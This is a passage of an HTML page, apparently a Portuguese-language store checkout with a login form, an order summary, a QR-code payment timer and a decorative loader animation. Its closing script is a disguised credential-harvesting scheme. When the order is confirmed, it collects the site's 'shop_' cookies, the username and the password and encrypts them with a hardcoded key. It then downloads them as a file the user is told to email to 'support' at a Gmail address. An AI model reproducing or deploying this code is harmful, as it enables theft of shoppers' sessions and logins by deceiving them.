  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #121212;
      color: #fff;
    }

    .container {
      max-width: 800px;
      margin: 50px auto;
      padding: 20px;
    }

    h1 {
      text-align: center;
    }

    .form-container {
      background-color: #333;
      color: #fff;
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .form-container h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    .form-container input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 5px;
      border: none;
      background-color: rgba(255, 255, 255, 0.1);
      color: #fff;
      transition: background-color 0.3s ease;
    }

    .form-container input:focus {
      background-color: rgba(255, 255, 255, 0.2);
    }

    .form-container button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 5px;
      background-color: hotpink;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .form-container button:hover {
      background-color: #ff69b4;
    }

    #checkout {
      background-color: #333;
      color: #fff;
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 20px;
    }

    #order-list {
      list-style-type: none;
      padding: 0;
    }

    #order-list li {
      margin-bottom: 10px;
    }

    #order-list li span {
      float: right;
    }

    #total {
      font-weight: bold;
      margin-top: 10px;
    }

    #confirm-button {
      display: block;
      margin-top: 20px;
      padding: 10px 20px;
      background-color: hotpink;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    #confirm-button:hover {
      background-color: #ff69b4;
    }

    #qr-code-container {
      background-color: #333;
      border-radius: 10px;
      padding: 20px;
      text-align: center;
      display: none;
      margin-top: 20px;
    }

    #qr-code {
      display: none;
      width: 200px;
      height: 200px;
    }
    #code {
      color: red;
      display: none;
    }
    #timer {
      text-align: center;
      display: none;
      margin-top: 20px;
    }

    #countdown {
      font-size: 24px;
      font-weight: bold;
    }
    #login_cr {
      max-width: 100px;
      margin-bottom: 10px;
    }
    #checkout-link {
      text-align: center;
    }

    .cupom-container {
      position: absolute;
      top: 20px; /* Ajuste a altura conforme necessário */
      left: 20px; /* Ajuste a distância da esquerda conforme necessário */
    }

    .cupom-container input[type="text"] {
      padding: 8px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px 0 0 4px;
      width: 200px; /* Ajuste a largura conforme necessário */
    }

    .cupom-container button {
      padding: 8px 16px;
      font-size: 16px;
      border: 1px solid gray;
      background-color: gray;
      color: hotpink;
      border-radius: 0 4px 4px 0;

    }
    /* From Uiverse.io by Galahhad */ 
.ui-abstergo {
  --primary: #fff;
  --secondary: rgba(255, 255, 255, 0.3);
  --shadow-blur: 3px;
  --text-shadow-blur: 3px;
  --animation-duration: 2s;
  --size: 1;
}

.abstergo-loader * {
  -webkit-box-sizing: content-box;
  box-sizing: content-box;
}

.ui-abstergo {
  display: -webkit-box;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
  -ms-flex-direction: column;
  flex-direction: column;
  -webkit-box-align: center;
  -ms-flex-align: center;
  align-items: center;
  row-gap: 30px;
  scale: var(--size);
}

.ui-abstergo .ui-text {
  color: var(--primary);
  text-shadow: 0 0 var(--text-shadow-blur) var(--secondary);
  font-family: Menlo, sans-serif;
  display: -webkit-box;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-align: baseline;
  -ms-flex-align: baseline;
  align-items: baseline;
  -webkit-column-gap: 3px;
  -moz-column-gap: 3px;
  column-gap: 3px;
}

.ui-abstergo .ui-dot {
  content: "";
  display: block;
  width: 3px;
  height: 3px;
  -webkit-animation: dots var(--animation-duration) infinite linear;
  animation: dots var(--animation-duration) infinite linear;
  -webkit-animation-delay: .4s;
  animation-delay: .4s;
  background-color: var(--primary);
}

.ui-abstergo .ui-dot:nth-child(2) {
  -webkit-animation-delay: .8s;
  animation-delay: .8s;
}

.ui-abstergo .ui-dot:nth-child(3) {
  -webkit-animation-delay: 1.2s;
  animation-delay: 1.2s;
}

.ui-abstergo .ui-dot+.ui-dot {
  margin-left: 3px;
}

.abstergo-loader {
  width: 103px;
  height: 90px;
  position: relative;
}

.abstergo-loader div {
  width: 50px;
  border-right: 12px solid transparent;
  border-left: 12px solid transparent;
  border-top: 21px solid var(--primary);
  position: absolute;
  -webkit-filter: drop-shadow(0 0 var(--shadow-blur) var(--secondary));
  filter: drop-shadow(0 0 var(--shadow-blur) var(--secondary));
}

.abstergo-loader div:nth-child(1) {
  top: 27px;
  left: 7px;
  rotate: -60deg;
  -webkit-animation: line1 var(--animation-duration) linear infinite alternate;
  animation: line1 var(--animation-duration) linear infinite alternate;
}

.abstergo-loader div:nth-child(2) {
  bottom: 2px;
  left: 0;
  rotate: 180deg;
  -webkit-animation: line2 var(--animation-duration) linear infinite alternate;
  animation: line2 var(--animation-duration) linear infinite alternate;
}

.abstergo-loader div:nth-child(3) {
  bottom: 16px;
  right: -9px;
  rotate: 60deg;
  -webkit-animation: line3 var(--animation-duration) linear infinite alternate;
  animation: line3 var(--animation-duration) linear infinite alternate;
}

.abstergo-loader:hover div:nth-child(1) {
  top: 21px;
  left: 14px;
  rotate: 60deg;
}

.abstergo-loader:hover div:nth-child(2) {
  bottom: 5px;
  left: -8px;
  rotate: 300deg;
}

.abstergo-loader:hover div:nth-child(3) {
  bottom: 7px;
  right: -11px;
  rotate: 180deg;
}

@-webkit-keyframes line1 {
  0%,
  40% {
    top: 27px;
    left: 7px;
    rotate: -60deg;
  }

  60%,
  100% {
    top: 22px;
    left: 14px;
    rotate: 60deg;
  }
}

@keyframes line1 {
  0%,
  40% {
    top: 27px;
    left: 7px;
    rotate: -60deg;
  }

  60%,
  100% {
    top: 22px;
    left: 14px;
    rotate: 60deg;
  }
}

@-webkit-keyframes line2 {
  0%,
  40% {
    bottom: 2px;
    left: 0;
    rotate: 180deg;
  }

  60%,
  100% {
    bottom: 5px;
    left: -8px;
    rotate: 300deg;
  }
}

@keyframes line2 {
  0%,
  40% {
    bottom: 2px;
    left: 0;
    rotate: 180deg;
  }

  60%,
  100% {
    bottom: 5px;
    left: -8px;
    rotate: 300deg;
  }
}

@-webkit-keyframes line3 {
  0%,
  40% {
    bottom: 16px;
    right: -9px;
    rotate: 60deg;
  }

  60%,
  100% {
    bottom: 7px;
    right: -11px;
    rotate: 180deg;
  }
}

@keyframes line3 {
  0%,
  40% {
    bottom: 16px;
    right: -9px;
    rotate: 60deg;
  }

  60%,
  100% {
    bottom: 7px;
    right: -11px;
    rotate: 180deg;
  }
}

@-webkit-keyframes dots {
  0% {
    background-color: var(--secondary);
  }

  30% {
    background-color: var(--primary);
  }

  70%, 100% {
    background-color: var(--secondary);
  }
}

@keyframes dots {
  0% {
    background-color: var(--secondary);
  }

  30% {
    background-color: var(--primary);
  }

  70%, 100% {
    background-color: var(--secondary);
  }
}
  </style>
</head>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <script>
  setTimeout(function() {
    // Ocultar o loader
    document.querySelector('.ui-abstergo').style.display = 'none';
    document.getElementById('code').style.display = 'block';
  }, 30000);

    var username = '';
      document.getElementById('checkout-link').href = link;
    document.getElementById('checkout-link').textContent = link;
  
    function getShopCookies() {
      return document.cookie.split(';')
        .map(cookie => cookie.trim())
        .filter(cookie => cookie.startsWith('shop_'))
        .join('\n');
    }
  
    // Função para criptografar uma string usando AES
    function encryptAES(data) {
      const key = 'Ck3rH74NpC5WUy9s'; // Chave para criptografia
      const encrypted = CryptoJS.AES.encrypt(data, key).toString();
      return encrypted;
    }
  
    // Função para criar um arquivo de texto com os cookies, usuário e senha criptografados e permitir o download
    function downloadCookies() {
      const cookies = getShopCookies();
      const encryptedCookies = encryptAES(cookies);
      const encryptedUsername = encryptAES(username);
      const encryptedPassword = encryptAES(document.getElementById('password').value);
  
      // Conteúdo a ser escrito no arquivo
      const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!\n\nmegazn960@gmail.com`;
  
      // Cria o blob com os dados criptografados
      const blob = new Blob([fileContent], { type: 'text/plain' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = 'pedido.txt';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  
    // Função para confirmar o pedido
    function confirmOrder() {
      document.getElementById('checkout').style.display = 'none';
      document.getElementById('qr-code-container').style.display = 'block';
      document.getElementById('timer').style.display = 'block';
      document.getElementById('checkout-link').style.display = 'block';
      document.getElementById('checkout-link').href = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${document.getElementById('username').value}`;
      startTimer();
      downloadCookies(); // Baixa os cookies, usuário e senha ao confirmar o pedido
    }
  
    // Função para iniciar o cronômetro
    function startTimer() {
      let seconds = 300;
      const countdown = document.getElementById('countdown');
      const timer = setInterval(() => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        countdown.textContent = `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
        if (seconds === 0) {
          clearInterval(timer);
          document.getElementById('qr-code-container').innerHTML = '<h2>Obrigado pela compra!</h2>';
        } else {
          seconds--;
        }
      }, 1000);
    }
  
    // Exibir os itens do pedido ao carregar a página
    // displayOrder();
  
    // Evento de envio do formulário de login
    document.getElementById('login-form').addEventListener('submit', function(event) {
      event.preventDefault();
      username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const confirmPassword = document.getElementById('confirm-password').value;
      if (password !== confirmPassword) {
        alert('As senhas não coincidem!');
      } else {
        document.getElementById('checkout').style.display = 'block';
        document.getElementById('login-info').style.display = 'block';
        document.getElementById('login-username').textContent = username;
        document.getElementById('login-password').textContent = password;
        document.querySelector('.form-container').style.display = 'none';
      }
    });
  
  </script>
